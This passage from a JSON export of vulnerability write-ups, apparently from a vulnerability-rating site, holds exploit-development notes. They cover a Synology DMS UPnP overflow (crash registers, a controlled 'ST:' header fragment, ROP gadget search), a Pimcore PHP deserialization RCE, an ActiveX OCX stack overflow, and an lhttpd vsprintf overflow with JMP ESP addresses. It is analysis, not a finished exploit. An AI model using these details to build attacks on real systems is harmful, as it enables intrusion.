            ; std::__throw_length_error(char  const*)\n.got.plt:080BA4E0 off_80BA4E0     dd offset _ZdaPv        ; DATA XREF: operator delete[](void *)r\n.got.plt:080BA4E0                                         ; operator delete[](void *)\n.got.plt:080BA4E4 off_80BA4E4     dd offset exit          ; DATA XREF: _exitr\n.got.plt:080BA4E8 off_80BA4E8     dd offset ixmlNode_getNodeType\n.got.plt:080BA4E8                                         ; DATA XREF: _ixmlNode_getNodeTyper\n.got.plt:080BA4EC off_80BA4EC     dd offset UpnpSetDescURL ; DATA XREF: _UpnpSetDescURLr\n.got.plt:080BA4F0 off_80BA4F0     dd offset _ZNSs6assignERKSs\n.got.plt:080BA4F0                                         ; DATA XREF: std::string::assign(std::string  const&)r\n.got.plt:080BA4F0                                         ; std::string::assign(std::string  const&)\n.got.plt:080BA4F4 off_80BA4F4     dd offset _ZN11MediaServer18SQLEscapeConditionERKSs\n.got.plt:080BA4F4                                         ; DATA XREF: MediaServer::SQLEscapeCondition(std::string  const&)r\n.got.plt:080BA4F4                                         ; MediaServer::SQLEscapeCondition(std::string  const&)\n.got.plt:080BA4F8 off_80BA4F8     dd offset _ZN11MediaServer15SQLEscapeStringERKSs\n.got.plt:080BA4F8                                         ; DATA XREF: MediaServer::SQLEscapeString(std::string  const&)r\n.got.plt:080BA4F8                                         ; MediaServer::SQLEscapeString(std::string  const&)\n.got.plt:080BA4FC off_80BA4FC     dd offset SLIBNetGetInterfaceInfo\n.got.plt:080BA4FC                                         ; DATA XREF: _SLIBNetGetInterfaceInfor\n.got.plt:080BA500 off_80BA500     dd offset free          ; DATA XREF: _freer\n.got.plt:080BA504 off_80BA504     dd offset _ZN11MediaServer9URLEncodeERKSs\n.got.plt:080BA504                                         ; DATA XREF: MediaServer::URLEncode(std::string  const&)r\n.got.plt:080BA504                                         ; MediaServer::URLEncode(std::string  const&)\n.got.plt:080BA508 off_80BA508     dd offset _ZNSs12_M_leak_hardEv\n.got.plt:080BA508                                         ; DATA XREF: std::string::_M_leak_hard(void)r\n.got.plt:080BA508                                         ; std::string::_M_leak_hard(void)\n.got.plt:080BA50C off_80BA50C     dd offset _ZN11MediaServer13StringReplaceESsSsSs\n.got.plt:080BA50C                                         ; DATA XREF: MediaServer::StringReplace(std::string,std::string,std::string)r\n.got.plt:080BA50C                                         ; MediaServer::StringReplace(std::string,std::string,std::string)\n.got.plt:080BA510 off_80BA510     dd offset ixmlLoadDocumentEx\n.got.plt:080BA510                                         ; DATA XREF: _ixmlLoadDocumentExr\n.got.plt:080BA514 off_80BA514     dd offset pcre_study    ; DATA XREF: _pcre_studyr\n.got.plt:080BA518 off_80BA518     dd offset UpnpRegisterRootDevice\n.got.plt:080BA518                                         ; DATA XREF: _UpnpRegisterRootDevicer\n.got.plt:080BA51C off_80BA51C     dd offset _ZN14SynoAudioUtils16RadioGetStationsEjiiRSt6vectorINS_12RadioStationESaIS1_EERi\n.got.plt:080BA51C                                         ; DATA XREF: SynoAudioUtils::RadioGetStations(uint,int,int,std::vector<SynoAudioUtils::RadioStation,std::allocator<SynoAudioUtils::RadioStation>> &,int &)r\n.got.plt:080BA51C                                         ; SynoAudioUtils::RadioGetStations(uint,int,int,std::vector<SynoAudioUtils::RadioStation,std::allocator<SynoAudioUtils::RadioStation>> &,int &)\n.got.plt:080BA520 off_80BA520     dd offset memset        ; DATA XREF: _memsetr\n.got.plt:080BA524 off_80BA524     dd offset _ZSt20__throw_out_of_rangePKc\n.got.plt:080BA524                                         ; DATA XREF: std::__throw_out_of_range(char  const*)r\n.got.plt:080BA524                                         ; std::__throw_out_of_range(char  const*)\n.got.plt:080BA528 off_80BA528     dd offset strncasecmp   ; DATA XREF: _strncasecmpr\n.got.plt:080BA52C off_80BA52C     dd offset _ZN4Json5ValueD1Ev\n.got.plt:080BA52C                                         ; DATA XREF: Json::Value::~Value()r\n.got.plt:080BA52C                                         ; Json::Value::~Value()\n.got.plt:080BA530 off_80BA530     dd offset _ZN7pcrecpp3Arg12parse_stringEPKciPv\n.got.plt:080BA530                                         ; DATA XREF: .plt:pcrecpp::Arg::parse_string(char  const*,int,void *)r\n.got.plt:080BA530                                         ; pcrecpp::Arg::parse_string(char  const*,int,void *)\n.got.plt:080BA534 off_80BA534     dd offset ixmlNamedNodeMap_getNamedItem\n.got.plt:080BA534                                         ; DATA XREF: _ixmlNamedNodeMap_getNamedItemr\n.got.plt:080BA538 off_80BA538     dd offset _ZNSs6assignEPKcj\n.got.plt:080BA538                                         ; DATA XREF: std::string::assign(char  const*,uint)r\n.got.plt:080BA538                                         ; std::string::assign(char  const*,uint)\n.got.plt:080BA53C off_80BA53C     dd offset _ZN11MediaServer7MediaDB20AddExcludeVideoCodecESs\n.got.plt:080BA53C                                         ; DATA XREF: MediaServer::MediaDB::AddExcludeVideoCodec(std::string)r\n.got.plt:080BA53C                                         ; MediaServer::MediaDB::AddExcludeVideoCodec(std::string)\n.got.plt:080BA540 off_80BA540     dd offset lseek64       ; DATA XREF: _lseek64r\n.got.plt:080BA544 off_80BA544     dd offset _ZNSt9basic_iosIcSt11char_traitsIcEE4initEPSt15basic_streambufIcS1_E\n.got.plt:080BA544                                         ; DATA XREF: std::basic_ios<char,std::char_traits<char>>::init(std::basic_streambuf<char,std::char_traits<char>> *)r\n.got.plt:080BA544                                         ; std::basic_ios<char,std::char_traits<char>>::init(std::basic_streambuf<char,std::char_traits<char>> *)\n.got.plt:080BA548 off_80BA548     dd offset _ZN7pcrecpp2RED1Ev\n.got.plt:080BA548                                         ; DATA XREF: pcrecpp::RE::~RE()r\n.got.plt:080BA548                                         ; pcrecpp::RE::~RE()\n.got.plt:080BA54C off_80BA54C     dd offset _Unwind_Resume ; DATA XREF: __Unwind_Resumer\n.got.plt:080BA550 off_80BA550     dd offset _ZN11MediaServer14FileGetFileExtERKSs\n.got.plt:080BA550                                         ; DATA XREF: MediaServer::FileGetFileExt(std::string  const&)r\n.got.plt:080BA550                                         ; MediaServer::FileGetFileExt(std::string  const&)\n.got.plt:080BA554 off_80BA554     dd offset _ZN11MediaServer19FileGetPathBaseNameERKSs\n.got.plt:080BA554                                         ; DATA XREF: MediaServer::FileGetPathBaseName(std::string  const&)r\n.got.plt:080BA554                                         ; MediaServer::FileGetPathBaseName(std::string  const&)\n.got.plt:080BA558 off_80BA558     dd offset __strtoul_internal\n.got.plt:080BA558                                         ; DATA XREF: ___strtoul_internalr\n.got.plt:080BA55C off_80BA55C     dd offset UpnpSetMaxContentLength\n.got.plt:080BA55C                                         ; DATA XREF: _UpnpSetMaxContentLengthr\n.got.plt:080BA560 off_80BA560     dd offset _ZN11MediaServer7MediaDB14FetchMediaItemER21__tag_SYNO_MEDIA_INFO\n.got.plt:080BA560                                         ; DATA XREF: MediaServer::MediaDB::FetchMediaItem(__tag_SYNO_MEDIA_INFO &)r\n.got.plt:080BA560                                         ; MediaServer::MediaDB::FetchMediaItem(__tag_SYNO_MEDIA_INFO &)\n.got.plt:080BA564 off_80BA564     dd offset _ZNKSs5rfindEcj\n.got.plt:080BA564                                         ; DATA XREF: std::string::rfind(char,uint)r\n.got.plt:080BA564                                         ; std::string::rfind(char,uint)\n.got.plt:080BA568 off_80BA568     dd offset SYNOPlaylistRecFree\n.got.plt:080BA568                                         ; DATA XREF: _SYNOPlaylistRecFreer\n.got.plt:080BA56C off_80BA56C     dd offset pthread_mutex_unlock\n.got.plt:080BA56C                                         ; DATA XREF: _pthread_mutex_unlockr\n.got.plt:080BA570 off_80BA570     dd offset ixmlDocument_getElementsByTagName\n.got.plt:080BA570                                         ; DATA XREF: _ixmlDocument_getElementsByTagNamer\n.got.plt:080BA574 off_80BA574     dd offset _ZN11MediaServer7MediaDB6SelectERKSsS2_iiS2_\n.got.plt:080BA574                                         ; DATA XREF: MediaServer::MediaDB::Select(std::string  const&,std::string  const&,int,int,std::string  const&)r\n.got.plt:080BA574                                         ; MediaServer::MediaDB::Select(std::string  const&,std::string  const&,int,int,std::string  const&)\n.got.plt:080BA578 off_80BA578     dd offset ixmlNodeList_free\n.got.plt:080BA578                                         ; DATA XREF: _ixmlNodeList_freer\n.got.plt:080BA57C off_80BA57C     dd offset __cxa_throw   ; DATA XREF: ___cxa_throwr\n.got.plt:080BA580 off_80BA580     dd offset _ZN4Json5ValueixEPKc\n.got.plt:080BA580                                         ; DATA XREF: Json::Value::operator[](char  const*)r\n.got.plt:080BA580                                         ; Json::Value::operator[](char  const*)\n.got.plt:080BA584 off_80BA584     dd offset printfPQExpBuffer\n.got.plt:080BA584                                         ; DATA XREF: _printfPQExpBufferr\n.got.plt:080BA588 off_80BA588     dd offset UpnpAddVirtualDir\n.got.plt:080BA588                                         ; DATA XREF: _UpnpAddVirtualDirr\n.got.plt:080BA58C off_80BA58C     dd offset _ZN11MediaServer13DMSClientList7FindKeyERKSsS2_\n.got.plt:080BA58C                                         ; DATA XREF: MediaServer::DMSClientList::FindKey(std::string  const&,std::string  const&)r\n.got.plt:080BA58C                                         ; MediaServer::DMSClientList::FindKey(std::string  const&,std::string  const&)\n.got.plt:080BA590 off_80BA590     dd offset _ZN11MediaServer7MediaDBC1E21_tag_MEDIA_TABLE_TYPEP13DBConnect_tag\n.got.plt:080BA590                                         ; DATA XREF: MediaServer::MediaDB::MediaDB(_tag_MEDIA_TABLE_TYPE,DBConnect_tag *)r\n.got.plt:080BA590                                         ; MediaServer::MediaDB::MediaDB(_tag_MEDIA_TABLE_TYPE,DBConnect_tag *)\n.got.plt:080BA594 off_80BA594     dd offset _ZN11MediaServer16DMSClientChecker17ReleaseClientListEv\n.got.plt:080BA594                                         ; DATA XREF: MediaServer::DMSClientChecker::ReleaseClientList(void)r\n.got.plt:080BA594                                         ; MediaServer::DMSClientChecker::ReleaseClientList(void)\n.got.plt:080BA598 off_80BA598     dd offset _ZN4Json18StyledStreamWriter5writeERSoRKNS_5ValueE\n.got.plt:080BA598                                         ; DATA XREF: Json::StyledStreamWriter::write(std::ostream &,Json::Value  const&)r\n.got.plt:080BA598                                         ; Json::StyledStreamWriter::write(std::ostream &,Json::Value  const&)\n.got.plt:080BA59C off_80BA59C     dd offset _ZN11MediaServer13StringImplodeERKSt6vectorISsSaISsEEPKc\n.got.plt:080BA59C                                         ; DATA XREF: MediaServer::StringImplode(std::vector<std::string,std::allocator<std::string>>  const&,char  const*)r\n.got.plt:080BA59C                                         ; MediaServer::StringImplode(std::vector<std::string,std::allocator<std::string>>  const&,char  const*)\n.got.plt:080BA5A0 off_80BA5A0     dd offset __gxx_personality_v0\n.got.plt:080BA5A0                                         ; DATA XREF: .plt:___gxx_personality_v0r\n.got.plt:080BA5A4 off_80BA5A4     dd offset pcre_free_substring_list\n.got.plt:080BA5A4                                         ; DATA XREF: _pcre_free_substring_listr\n.got.plt:080BA5A8 off_80BA5A8     dd offset pcre_exec     ; DATA XREF: _pcre_execr\n.got.plt:080BA5AC off_80BA5AC     dd offset UpnpDownloadXmlDoc\n.got.plt:080BA5AC                                         ; DATA XREF: _UpnpDownloadXmlDocr\n.got.plt:080BA5B0 off_80BA5B0     dd offset read          ; DATA XREF: _readr\n.got.plt:080BA5B4 off_80BA5B4     dd offset UpnpGetServerIpAddress\n.got.plt:080BA5B4                                         ; DATA XREF: _UpnpGetServerIpAddressr\n.got.plt:080BA5B8 off_80BA5B8     dd offset SLIBCErrGet   ; DATA XREF: _SLIBCErrGetr\n.got.plt:080BA5BC off_80BA5BC     dd offset _ZdlPv        ; DATA XREF: operator delete(void *)r\n.got.plt:080BA5BC                                         ; operator delete(void *)\n.got.plt:080BA5C0 off_80BA5C0     dd offset _ZNSt8ios_base4InitD1Ev\n.got.plt:080BA5C0                                         ; DATA XREF: sub_804D8E6:std::ios_base::Init::~Init()r\n.got.plt:080BA5C0                                         ; std::ios_base::Init::~Init()\n.got.plt:080BA5C4 off_80BA5C4     dd offset ParsePlayListByField\n.got.plt:080BA5C4                                         ; DATA XREF: _ParsePlayListByFieldr\n.got.plt:080BA5C4 _got_plt        ends\n.got.plt:080BA5C4\n```\n\n* Weird... maybe with other executables...\n\n* When exploiting cve-2012-5958 with x86 / ubuntu 10.04 compilation to simulate the DSM\nenvironment its the register situation at overflow time:\n\n```\nProgram received signal SIGSEGV, Segmentation fault.\n[Switching to Thread 0xb5fb6b70 (LWP 6628)]\n0x00414141 in ?? ()\n(gdb) info registers\neax            0x0\t0\necx            0xb5fb59e0\t-1241818656\nedx            0x0\t0\nebx            0x42424242\t1111638594\nesp            0xb5fb5c30\t0xb5fb5c30\nebp            0x42424242\t0x42424242\nesi            0x42424242\t1111638594\nedi            0x42424242\t1111638594\neip            0x414141\t0x414141\neflags         0x210282\t[ SF IF RF ID ]\ncs             0x73\t115\nss             0x7b\t123\nds             0x7b\t123\nes             0x7b\t123\nfs             0x0\t0\ngs             0x33\t51\n```\n\nESP pointint to\n\n```\n(gdb) x/xw $esp\n0xb5fb5c30:\t0x09170ad8\n\n(gdb) x/s 0x09170ad8\n0x9170ad8:\t \"uuid:schemas:device:\", 'B' <repeats 180 times>...\n```\n\nThe contents contained at the pointer at esp can be easily controlled by doing something like\n\n```\n\"ST:MSF1uuid:schemas:device:#{bof}:btw\\r\\n\" +\n\n(gdb) c\nContinuing.\n\nProgram received signal SIGSEGV, Segmentation fault.\n[Switching to Thread 0xb5f0fb70 (LWP 6729)]\n0x00414141 in ?? ()\n(gdb) x/x $esp\n0xb5f0ec30:\t0x09e97918\n(gdb) x/s 0x09e97918\n0x9e97918:\t \"MSF1uuid:schemas:device:\", 'B' <repeats 176 times>...\n```\n\n* If ASLR is disabled / unsupported (old kernels) and system() is mapped to a compatible address with goodchars,\n\tit could be used to NX bypass.\n\n* If ASLR is disabled and system isn't mapped to a compatible addresses, maybe wrappers can be found, for example, for the\ncase of the DMS Media Server, slibcsystem() (and other interesting wrappers for libc) are exported by libsynocore.so.3.1.....\nbut no luck when executing it into an Ubuntu 10.04 box (I guess mappings will be different on the original box, anyway in\nthe original box aslr is enabled):\n\n```\n(gdb) disass 0x37d000 + 0x10EBC\n\nDump of assembler code for function SLIBCSystem:\n   0x0038debc <+0>:\tpush   %ebp\n   0x0038debd <+1>:\tmov    %esp,%ebp\n   0x0038debf <+3>:\tpush   %ebx\n```\n\n* In order to run dms on an Ubuntu 10.04 box (easy way), just use the next ld config file:\n\n```\n(gdb) disass 0x37d000 + 0x10EBC\n\nDump of assembler code for function SLIBCSystem:\n   0x0038debc <+0>:\tpush   %ebp\n   0x0038debd <+1>:\tmov    %esp,%ebp\n   0x0038debf <+3>:\tpush   %ebx\n```\n\nand run ldconfig\n\n* ROP Gadgets can be searched with http://www.vnsecurity.net/2010/08/ropeme-rop-exploit-made-easy/, but some API pointers\nin compatible addresses are needed... tricky\n\n```\nROPeMe> generate /home/juan/DSM_40_X64_MediaServer/sbin/dms 5\nGenerating gadgets for /home/juan/DSM_40_X64_MediaServer/sbin/dms with backward depth=5\nIt may take few minutes depends on the depth and file size...\nProcessing code block 1/1\nGenerated 2492 gadgets\nDumping asm gadgets to file: dms.ggt ...\nOK\n```\n\n(Using dms because is no PIE compatible)\n\n\n",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "a1645d41-5cbb-4b51-9279-ce5e53fb4a66",
      "editorId": "e426cc12-067c-41a8-83c0-029757da0dbf",
      "topicId": "f0df659e-ebed-45ec-bf97-266a17ece28a",
      "created": "2019-09-12T18:07:08.104247Z",
      "revisionDate": "2020-02-13T17:12:20.437706Z",
      "document": "\n\n## Details\n\nThere exists a PHP deserialization vulnerability in Pimcore versions prior to 5.7.1 that allows the ability to gain remote code execution post authentication.\n\nThe Metasploit module documentation for `exploit/multi/http/pimcore_unserialize_rce` mentions that the PHP deserialization vulnerability exists in the `ClassController.php` file in the function that takes care of the `bulk-commit` method. The `bulkCommitAction()` function has a comment mentioning that it handles the `bulk-commit` route, so it's safe to say that analysis should start there.\n\nIn `bulkCommitAction()`, the serialized PHP object gets assigned to the `data` variable, and its layout type is checked in an `if` statement.\n\nThe block of code is quite large, but the important detail happens in the first few lines of the `elseif` block:\n\n```php\nelseif ($type == 'customlayout') {\n\t$layoutData = unserialize($data['name']);\n  $className = $layoutData['className'];\n  $layoutName = $layoutData['name'];\n\t...\n}\n```\n\n\n\nThe serialized payload is passed to the `unserialize()` function unsanitized, which will call the object's magic method, `__destruct()` in this case. The object used in Metasploit's module is an object of the `ApcuAdapter` class, which inherits its magic method from `AbstractAdapter`.\n\n`__destruct()` method:\n\n```php\npublic function __destruct()\n    {\n        if ($this->deferred) {\n            $this->commit();\n        }\n    }\n```\n\nThe `deferred` variable contains the PHP code, so the `commit()` function is called.\n\nIn `commit()`, there are two lines of interest:\n\n```php\n$byLifetime = $this->mergeByLifetime;\n$byLifetime = $byLifetime($this->deferred, $this->namespace, $expiredIds);\n```\n\nThe object's `mergeByLifetime` variable, which is set to `proc_open` in the serialized object, gets assigned to `$byLifetime`. In the next line, `$byLifetime` is executed with the object's instance variables passed as the arguments. As noted previously, the `deferred` variable contains the PHP code to execute. Viewing the serialized object in the `pimcore_unserialize_rce` Metasploit module shows us that the `namespace` variable is an empty array, and `$expiredIds` is a variable that will hold an array of file pointers. So summing this up, `proc_open()` will execute code embedded in a PHP serialized object, potentially giving unauthorized individuals shell access.\n",
      "score": 1,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 3,
        "urgent-to-patch": 5,
        "used-successfully": 5,
        "confidence-in-ratings": 3,
        "effort-to-develop-exploit": 3
      },
      "tags": []
    },
    {
      "id": "89b7789b-e810-4837-b7bb-3b612470f544",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "f60d7de2-5a45-4f4c-9637-7543b636e42b",
      "created": "2019-09-12T18:07:08.932259Z",
      "revisionDate": "2020-02-13T17:12:20.23539Z",
      "document": "\n.text:100021EA                 align 10h\n.text:100021F0\n.text:100021F0 loc_100021F0:                           ; CODE XREF: sub_10002140+A8j\n.text:100021F0                                         ; sub_10002140+BD1j\n.text:100021F0                 movzx   ecx, word ptr [eax]\n.text:100021F3                 mov     [edx+eax], cx\n.text:100021F7                 add     eax, 2\n.text:100021FA                 test    cx, cx\n.text:100021FD                 jnz     short loc_100021F0\n```\n\nedx points to a local variable, eax to the user controlled provided annotation.\n\nCrash:\n\n```\n(d98.4cc): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\n*** WARNING: Unable to verify checksum for C:\\PROGRA~1\\BLACKI~1\\BLACKI~2\\BLACKI~1\\BLACKI~1.OCX\n*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\\PROGRA~1\\BLACKI~1\\BLACKI~2\\BLACKI~1\\BLACKI~1.OCX -\neax=03719080 ebx=00000000 ecx=00000041 edx=fe906f80 esi=0201f1e0 edi=00000040\neip=100021f3 esp=0201f174 ebp=0201f38c iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206\nBLACKI_1!DllUnregisterServer+0xfc3:\n100021f3 66890c02        mov     word ptr [edx+eax],cx    ds:0023:02020000=4d5a\n0:008> db edx\n0:008> db eax\n03719080  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.\n03719090  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.\n037190a0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.\n037190b0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.\n037190c0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.\n037190d0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.\n037190e0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.\n037190f0  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.\n```\n\nIn this case the exception is due to a overflow of the stack space. Trying to write after stack generates an exception. But this situation is tricky to exploit in moden versions of IE because heap goes after stack... so generate an exception trends to be tricky. Will give a chance anyway.\n\nOn the other hand the vulnerable function is protected by stack cookies:\n\n```\n.text:1000221D                 xor     ecx, esp\n.text:1000221F                 call    @__security_check_cookie@4 ; __security_check_cookie(x)\n.text:10002224                 add     esp, 60h\n.text:10002227                 retn    3Ch\n.text:10002227 sub_10002140    endp\n```\n\nFinally doesn't look so bad for exploitation via seh overwrite, but bad luck because the OCX is safeseh = true :( So... sounds difficult to make it exploitable out of ie6/ie7\n",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "41074e5b-71bf-4395-b100-54aaabf75de7",
      "editorId": "951abedc-c7af-4fc4-ada3-7fff1f9114b4",
      "topicId": "8be90e5f-0a56-48b2-b8a1-f0cf45b12ca5",
      "created": "2019-09-12T18:07:09.847285Z",
      "revisionDate": "2020-02-13T17:12:19.999431Z",
      "document": "\n\n```\nstart    end        module name\n00400000 0041a000   lhttpd   C:\\Documents and Settings\\Administrator\\My Documents\\Downloads\\ad9f3af85dc51499f7d252eb11bac5a2-lhttpd0.1-win\\lhttpd\\lhttpd.exe\n662b0000 66308000   hnetcfg  C:\\WINDOWS\\system32\\hnetcfg.dll\n71a50000 71a8f000   mswsock  C:\\WINDOWS\\system32\\mswsock.dll\n71a90000 71a98000   wshtcpip C:\\WINDOWS\\System32\\wshtcpip.dll\n71aa0000 71aa8000   WS2HELP  C:\\WINDOWS\\system32\\WS2HELP.dll\n71ab0000 71ac7000   WS2_32   C:\\WINDOWS\\system32\\WS2_32.dll\n71ad0000 71ad9000   WSOCK32  C:\\WINDOWS\\system32\\WSOCK32.DLL\n76390000 763ad000   IMM32    C:\\WINDOWS\\system32\\IMM32.DLL\n77c10000 77c68000   msvcrt   C:\\WINDOWS\\system32\\msvcrt.dll\n77dd0000 77e6b000   ADVAPI32 C:\\WINDOWS\\system32\\ADVAPI32.dll\n77e70000 77f02000   RPCRT4   C:\\WINDOWS\\system32\\RPCRT4.dll\n77f10000 77f59000   GDI32    C:\\WINDOWS\\system32\\GDI32.dll\n77fe0000 77ff1000   Secur32  C:\\WINDOWS\\system32\\Secur32.dll\n7c800000 7c8f6000   kernel32 C:\\WINDOWS\\system32\\kernel32.dll\n7c900000 7c9af000   ntdll    C:\\WINDOWS\\system32\\ntdll.dll\n7e410000 7e4a1000   USER32   C:\\WINDOWS\\system32\\USER32.DLL\n```\n\n\nFound sequences (All Modules)\n\n```\nAddress    Disassembly                               Comment                                   Module Name\n00401000   JMP SHORT lhttpd.00401012                 (Initial CPU selection)                   C:\\Documents and Settings\\Administrator\\My Documents\\Downloads\\ad9f3af85dc51499f7d252eb11bac5a2-lhttpd0.1-win\\lhttpd\\lhttpd.exe\n662B1000   TEST AL,7C                                (Initial CPU selection)                   C:\\WINDOWS\\system32\\hnetcfg.dll\n662EB24F   JMP ESP                                                                             C:\\WINDOWS\\system32\\hnetcfg.dll\n71A51000   MOVS BYTE PTR ES:[EDI],BYTE PTR DS:[ESI]  (Initial CPU selection)                   C:\\WINDOWS\\system32\\mswsock.dll\n71A91000   SBB BL,BYTE PTR DS:[ESI]                  (Initial CPU selection)                   C:\\WINDOWS\\System32\\wshtcpip.dll\n71A91C8B   JMP ESP                                                                             C:\\WINDOWS\\System32\\wshtcpip.dll\n71AA1000   MOV ECX,A877DD7C                          (Initial CPU selection)                   C:\\WINDOWS\\system32\\WS2HELP.dll\n71AB1000   OUT DX,AL                                 (Initial CPU selection)                   C:\\WINDOWS\\system32\\WS2_32.dll\n71AD1000   ADC EAX,DWORD PTR ES:[ECX+8017E97C]       (Initial CPU selection)                   C:\\WINDOWS\\system32\\WSOCK32.DLL\n76391000   MOV EDX,A877DD7F                          (Initial CPU selection)                   C:\\WINDOWS\\system32\\IMM32.DLL\n77C11000   MOV BYTE PTR DS:[EAX+EAX*4+90FE017C],BL   (Initial CPU selection)                   C:\\WINDOWS\\system32\\msvcrt.dll\n77DD1000   SUB DWORD PTR DS:[ESI],EDX                (Initial CPU selection)                   C:\\WINDOWS\\system32\\ADVAPI32.dll\n77DEF049   JMP ESP                                                                             C:\\WINDOWS\\system32\\ADVAPI32.dll\n77DF965B   JMP ESP                                                                             C:\\WINDOWS\\system32\\ADVAPI32.dll\n77E18063   JMP ESP                                                                             C:\\WINDOWS\\system32\\ADVAPI32.dll\n77E23B63   JMP ESP                                                                             C:\\WINDOWS\\system32\\ADVAPI32.dll\n77E42A9F   JMP ESP                                                                             C:\\WINDOWS\\system32\\ADVAPI32.dll\n77E71000   MOV DH,79                                 (Initial CPU selection)                   C:\\WINDOWS\\system32\\RPCRT4.dll\n77E8560A   JMP ESP                                                                             C:\\WINDOWS\\system32\\RPCRT4.dll\n77E9025B   JMP ESP                                                                             C:\\WINDOWS\\system32\\RPCRT4.dll\n77F11000   INC ESI                                   (Initial CPU selection)                   C:\\WINDOWS\\system32\\GDI32.dll\n77F31D2F   JMP ESP                                                                             C:\\WINDOWS\\system32\\GDI32.dll\n77FE1000   PUSH EDI                                  (Initial CPU selection)                   C:\\WINDOWS\\system32\\Secur32.dll\n7C801000   INT 81                                    (Initial CPU selection)                   C:\\WINDOWS\\system32\\kernel32.dll\n7C86467B   JMP ESP                                                                             C:\\WINDOWS\\system32\\kernel32.dll\n7C901000   MOV ECX,DWORD PTR FS:[18]                 (Initial CPU selection)                   C:\\WINDOWS\\system32\\ntdll.dll\n7E411000   SALC                                      (Initial CPU selection)                   C:\\WINDOWS\\system32\\USER32.DLL\n7E429353   JMP ESP                                                                             C:\\WINDOWS\\system32\\USER32.DLL\n7E4456F7   JMP ESP                                                                             C:\\WINDOWS\\system32\\USER32.DLL\n7E455AF7   JMP ESP                                                                             C:\\WINDOWS\\system32\\USER32.DLL\n7E45B310   JMP ESP                                                                             C:\\WINDOWS\\system32\\USER32.DLL\n```\n\nDump:\n\n```\n00dfbceb 90 90 90 90 90 90 90  .......\n00dfbcf2 90 90 90 90 90 90 90  .......\n00dfbcf9 90 90 90 90 90 20 2d  ..... -\n00dfbd00 20 43 6f 6e 6e 65 63   Connec\n00dfbd07 74 69 6f 6e 20 66 72  tion fr\n00dfbd0e 6f 6d 20 31 30 2e 30  om 10.0\n00dfbd15 2e 31 2e 37 36 2c 20  .1.76,\n00dfbd1c 72 65 71 75 65 73 74  request\n00dfbd23 20 3d 20 22 47 45 54   = \"GET\n00dfbd2a 20 2f 90 90 90 90 90   /.....\n00dfbd31 90 90 90 90 90 90 90  .......\n00dfbd38 90 90 90 90 90 90 90  .......\n00dfbd3f 90 90 90 90 90 90 90  .......\n00dfbd46 90 90 90 90 90 90 90  .......\n```\n\n\nIn function serveconnection(), protocol.c:\n\n```\n  Log(\"Connection from %s, request = \\\"GET %s\\\"\", inet_ntoa(sa.sin_addr), ptr);\n```\n\nThe Log() function comes from util.c:\n\n```\n\tvoid Log(char *format, ...)\n\t{\n\t\tFILE *logfile;\n\t\ttime_t t;\n\t\tstruct tm *tm;\n\t\tchar temp[200], temp2[200], logfilename[255];\n\t\tchar datetime[] = \"[%d.%m.%Y] [%H:%M.%S]\";\n\t\tchar datetime_final[128];\n\t\tva_list ap;\n\n\t\tva_start(ap, format);\t\t// format it all into temp\n\t\tvsprintf(temp, format, ap);\n```\n",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "490d7f09-7b32-4d65-9cbc-cb784362cb70",
      "editorId": "e426cc12-067c-41a8-83c0-029757da0dbf",
      "topicId": "c7f37784-ea9e-49f2-a41c-1401def6f87a",
      "created": "2019-09-12T18:07:10.676236Z",
      "revisionDate": "2020-02-13T17:12:19.760769Z",
      "document": "\n\n## Details\n\nThe `soffice` binary allows passing arguments in order to listen on a host ip and port. Axel Boesenach found that the Apache UNO API that acts as a communication bridge to the `soffice` process\ncan execute shell commands through the `XSystemShellExecute` execute module. This exploit is useful in that exploitation comes easy through the usage of a Python library. Discovering targets running\nthis process are likely rare, given that the functionality exploited here is rarely used, and there is no default port that this service listens on. The effort to exploit this vulnerability was\ngiven a higher rating due to these caveats.\n",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 2,
        "urgent-to-patch": 1,
        "used-successfully": 5,
        "confidence-in-ratings": 3,
        "effort-to-develop-exploit": 2
      },
      "tags": []
    },
    {
      "id": "57d03c8f-8fc0-4295-a4f5-4e330ee2cc23",
      "editorId": "d88538cf-ab2c-464f-bb08-607db9cef99f",
      "topicId": "e3d19c07-c95a-439c-90bd-63f8777c6ec0",
      "created": "2019-09-12T18:07:11.545803Z",
      "revisionDate": "2020-02-13T17:12:19.523202Z",
      "document": "\n\n## Details\n\nThe vulnerable code can be found in network_ssl_upload.php:\n\n```php\n    22 $path = \"./upload/\";\n    23 $file = $_FILES[ \"attachFile\" ];\n    24 $isApply = ( int )$_POST[ \"is_apply\" ];\n    25 $isInstall = ( int )$_POST[ \"isInstall\" ];\n    26 $isCertFlag = ( int )$_POST[ \"isCertFlag\" ];\n    27\n    28 // create socket\n    29 $N_message = \"\";\n    30 $sock = mySocket_create($_is_unix_socket);\n    31 $connected = mySocket_connect($_is_unix_socket, $sock);\n    32\n    33 $loginInfo = new loginInfo();\n    34 $retLogin = loginManager( $connected, $sock, null, $loginInfo );\n    35 if ( ( $retLogin == true ) && ( $isApply == 2 || $isApply == 3 ) ) {\n    36  if ($connected) {\n    37   $id = $loginInfo->get_id();\n    38   $xmlFile = $id.'_config.xml';\n    39   $N_message = \"dummy\".nvr_command::DELIM;\n    40   $N_message .= \"userid \".$id.nvr_command::DELIM;\n    41\n    42   if ( $isInstall == 1 ) {\n    43    // File upload ===============================================================\n   